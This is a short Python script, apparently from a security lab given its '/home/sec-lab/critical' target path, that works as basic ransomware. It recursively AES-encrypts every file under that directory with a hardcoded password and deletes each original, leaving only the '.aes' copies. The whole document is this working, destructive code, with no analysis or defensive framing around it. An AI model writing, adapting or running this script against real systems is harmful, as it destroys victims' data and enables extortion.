import pyAesCrypt
import glob
import os
# Encryption/decryption buffer size
bufferSize = 64 * 1024

# Get current directory is used to get the current directory
currentDir = os.getcwd()

#I have given the below Password to the encrypt files
pwd = 'Ah@f781'
 
# Code to encrypt all files recursively
for x in glob.glob('/home/sec-lab/critical/**/*', recursive=True):
    fullpath = os.path.join(currentDir, x)
    newpath = os.path.join(currentDir, x + '.aes')
    
    # Encryption code
    if os.path.isfile(fullpath):
        
        print('Encrypted File: \t' + newpath + '\n')
        pyAesCrypt.encryptFile(fullpath, newpath, pwd, bufferSize)
      
       # Remove file after encryption
        os.remove(fullpath)
        